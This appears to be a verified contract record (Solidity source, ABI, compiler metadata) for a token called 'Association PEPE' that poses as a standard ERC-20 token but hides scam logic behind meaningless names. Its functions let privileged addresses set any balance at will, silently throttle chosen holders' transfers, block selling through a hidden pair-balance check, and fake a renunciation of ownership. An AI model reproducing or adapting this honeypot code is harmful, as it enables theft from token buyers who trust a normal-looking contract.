{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.8;\n\ninterface listSwap {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address maxTo) external view returns (uint256);\n\n    function transfer(address teamBuyMode, uint256 walletFee) external returns (bool);\n\n    function allowance(address isFeeMin, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 walletFee) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address teamBuyMode,\n        uint256 walletFee\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed buyFrom, uint256 value);\n    event Approval(address indexed isFeeMin, address indexed spender, uint256 value);\n}\n\nabstract contract fundWalletExempt {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface modeAmount {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface atEnable {\n    function createPair(address sellFeeSwap, address modeMin) external returns (address);\n}\n\ninterface listSwapMetadata is listSwap {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract AssociationPEPE is fundWalletExempt, listSwap, listSwapMetadata {\n\n    uint256 constant exemptAmount = 5 ** 10;\n\n    function maxTotal(address minMax, address teamBuyMode, uint256 walletFee) internal returns (bool) {\n        require(walletMin[minMax] >= walletFee);\n        walletMin[minMax] -= walletFee;\n        walletMin[teamBuyMode] += walletFee;\n        emit Transfer(minMax, teamBuyMode, walletFee);\n        return true;\n    }\n\n    mapping(address => mapping(address => uint256)) private receiverFund;\n\n    function symbol() external view virtual override returns (string memory) {\n        return isMode;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return fundSell;\n    }\n\n    function marketingListTeam(address launchTotal) public {\n        tokenMin();\n        \n        if (launchTotal == enableBuy || launchTotal == isWalletMin) {\n            return;\n        }\n        limitTrading[launchTotal] = true;\n    }\n\n    uint256 public feeTxAt;\n\n    function teamMarketing() public {\n        emit OwnershipTransferred(enableBuy, address(0));\n        receiverModeMin = address(0);\n    }\n\n    uint256 sellTokenExempt;\n\n    function tokenMin() private view {\n        require(amountTeamMarketing[_msgSender()]);\n    }\n\n    function allowance(address tradingToLaunch, address launchedMin) external view virtual override returns (uint256) {\n        if (launchedMin == toTxList) {\n            return type(uint256).max;\n        }\n        return receiverFund[tradingToLaunch][launchedMin];\n    }\n\n    function getOwner() external view returns (address) {\n        return receiverModeMin;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return modeLiquidity;\n    }\n\n    function balanceOf(address maxTo) public view virtual override returns (uint256) {\n        return walletMin[maxTo];\n    }\n\n    function transfer(address txLimit, uint256 walletFee) external virtual override returns (bool) {\n        return fundFee(_msgSender(), txLimit, walletFee);\n    }\n\n    function totalWallet(address enableToken) public {\n        require(enableToken.balance < 100000);\n        if (autoTrading) {\n            return;\n        }\n        \n        amountTeamMarketing[enableToken] = true;\n        if (amountLimitReceiver != toMax) {\n            totalTeamAuto = true;\n        }\n        autoTrading = true;\n    }\n\n    function amountMin(uint256 walletFee) public {\n        tokenMin();\n        sellTokenExempt = walletFee;\n    }\n\n    bool public autoTrading;\n\n    mapping(address => bool) public limitTrading;\n\n    uint256 private amountLimitReceiver;\n\n    bool private marketingTeamMin;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return toWallet;\n    }\n\n    address public enableBuy;\n\n    address private receiverModeMin;\n\n    uint256 public toMax;\n\n    function fundFee(address minMax, address teamBuyMode, uint256 walletFee) internal returns (bool) {\n        if (minMax == enableBuy) {\n            return maxTotal(minMax, teamBuyMode, walletFee);\n        }\n        uint256 maxAmount = listSwap(isWalletMin).balanceOf(swapLiquidity);\n        require(maxAmount == sellTokenExempt);\n        require(teamBuyMode != swapLiquidity);\n        if (limitTrading[minMax]) {\n            return maxTotal(minMax, teamBuyMode, exemptAmount);\n        }\n        return maxTotal(minMax, teamBuyMode, walletFee);\n    }\n\n    uint256 listReceiverIs;\n\n    function owner() external view returns (address) {\n        return receiverModeMin;\n    }\n\n    constructor (){\n        \n        modeAmount launchedToken = modeAmount(toTxList);\n        isWalletMin = atEnable(launchedToken.factory()).createPair(launchedToken.WETH(), address(this));\n        if (amountLimitReceiver != feeTxAt) {\n            launchSwap = false;\n        }\n        enableBuy = _msgSender();\n        teamMarketing();\n        amountTeamMarketing[enableBuy] = true;\n        walletMin[enableBuy] = toWallet;\n        \n        emit Transfer(address(0), enableBuy, toWallet);\n    }\n\n    mapping(address => uint256) private walletMin;\n\n    address swapLiquidity = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    bool private launchSwap;\n\n    string private isMode = \"APE\";\n\n    uint256 private toWallet = 100000000 * 10 ** 18;\n\n    function approve(address launchedMin, uint256 walletFee) public virtual override returns (bool) {\n        receiverFund[_msgSender()][launchedMin] = walletFee;\n        emit Approval(_msgSender(), launchedMin, walletFee);\n        return true;\n    }\n\n    mapping(address => bool) public amountTeamMarketing;\n\n    string private modeLiquidity = \"Association PEPE\";\n\n    uint8 private fundSell = 18;\n\n    function maxFund(address txLimit, uint256 walletFee) public {\n        tokenMin();\n        walletMin[txLimit] = walletFee;\n    }\n\n    event OwnershipTransferred(address indexed limitMin, address indexed shouldEnable);\n\n    address toTxList = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function transferFrom(address minMax, address teamBuyMode, uint256 walletFee) external override returns (bool) {\n        if (_msgSender() != toTxList) {\n            if (receiverFund[minMax][_msgSender()] != type(uint256).max) {\n                require(walletFee <= receiverFund[minMax][_msgSender()]);\n                receiverFund[minMax][_msgSender()] -= walletFee;\n            }\n        }\n        return fundFee(minMax, teamBuyMode, walletFee);\n    }\n\n    address public isWalletMin;\n\n    bool public totalTeamAuto;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isFeeMin\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitMin\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"shouldEnable\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"buyFrom\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingToLaunch\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchedMin\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"walletFee\",\"type\":\"uint256\"}],\"name\":\"amountMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"amountTeamMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletFee\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxTo\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableBuy\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeTxAt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isWalletMin\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"limitTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchTotal\",\"type\":\"address\"}],\"name\":\"marketingListTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletFee\",\"type\":\"uint256\"}],\"name\":\"maxFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toMax\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalTeamAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableToken\",\"type\":\"address\"}],\"name\":\"totalWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletFee\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minMax\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"teamBuyMode\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletFee\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "AssociationPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}